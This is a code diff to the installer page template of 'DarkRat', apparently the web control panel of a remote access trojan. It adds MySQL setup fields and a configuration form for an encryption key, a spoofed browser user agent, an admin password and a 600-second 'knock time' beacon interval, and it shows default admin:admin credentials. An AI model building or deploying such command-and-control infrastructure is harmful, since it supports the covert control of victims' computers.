@@ -9,7 +9,10 @@ body { font-family: Arial;
   width: 1000px;
   margin: 0 auto;
 }
-
+input {
+width: 100%;
+  margin-bottom: 10px;
+}
 /* Style the tab */
 .tab {
   overflow: hidden;
@@ -51,8 +54,6 @@ body { font-family: Arial;
 <body>
 
 <h2>DarkRat Installer </h2>
-<p>What hackers do is figure out technology and experiment with it in ways many people never imagined. They also have a strong desire to share this information with others and to explain it to people whose only qualification may be the desire to learn.</p>
-
 
 <div class="tab">
   <button class="tablinks" {if $finishing}{else} id="defaultOpen"{/if} onclick="openTab(event, 'Requirements')">Requirements</button>
@@ -83,18 +84,18 @@ body { font-family: Arial;
 <div id="Database" class="tabcontent">
   <h3>Create MySql</h3>
 
-  <form method="POST">Create MySql
+  <form method="POST" action="/install?installer=1">Create MySql
     <label>MySQL Username</label>
-    <input name="mysqlusername">
+    <input name="mysqlusername" required>
     <br>
     <label>MySQL Password</label>
-    <input name="mysqlpassword">
+    <input name="mysqlpassword" required>
     <hr>
     <label>MySQL Database</label>
-    <input name="databaseName"> (Make sure this is Existing)
+    <input name="databaseName" required> (Make sure this is Existing)
 
     <hr>
-    <input value="Install" type="submit">
+    <input value="Install" name="install" type="submit">
   </form>
 
 
@@ -103,28 +104,60 @@ body { font-family: Arial;
 
 <div id="Finishing" class="tabcontent">
 
-<!--
-  <label>Encryption Key</label>
-    <input name="encryptionkey">
-  <label>User Agent</label>
-    <input name="useragent">
-  <label>Knock Time</label>
-    <input name="requestinterval">
-    <input type="submit">
+  <div class="hidden">
 
-  -->
-  <p>
-    Login:<br>
-    admin<br>
-    admin
-  </p>
+  <h3>Welcome to your DarkRat control panel</h3>
+  <p>You havn’t configured your DarkRat control panel, yet. Do you wish to do so?</p>
+<br>
+
+  <a href="#" onclick="startConfig()" style="color:white;"> Yes, start the configuration.</a>
+<br>
+
+
+<br>
+
+    <a href="/login" style="color:white;"> No, I will do it later.</a>
+    <p>Login with admin:admin</p>
+</div>
+    <div class="finish_config" style="display:none;">
+<form method="post">
+  <label>Encryption Key</label>
+  <input name="encryptionkey" required placeholder=" set a random encryption key (32 Lenght)"><br>
+  <label>User Agent</label>
+  <input name="useragent" value="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Safari" required><br>
+  <label>MySQL Install Password</label> <br>
+  <input name="installPW" placeholder="MySql Install Password" required><br>
+
+  <label>new admin password</label> <br>
+  <input name="adminPW" placeholder="new admin password" required><br>
+
+  <label>Knock Time</label>
+  <input name="requestinterval" value="600" required><br>
+  <input type="submit" name="config" value="Finish Setup">
+</form>
+    </div>
+
+
+
+
+
+  <br>
 <hr>
-  <a href="/login" style="color:white;">Login</a>
 
 
 </div>
 
 <script>
+  function startConfig(){
+
+      document.getElementsByClassName("finish_config")[0].style.display = "block";
+      document.getElementsByClassName("hidden")[0].style.display = "none";
+  }
+
+  {if $step == 2}
+    startConfig();
+  {/if}
+
 function openTab(evt, cityName) {
   var i, tabcontent, tablinks;
   tabcontent = document.getElementsByClassName("tabcontent");
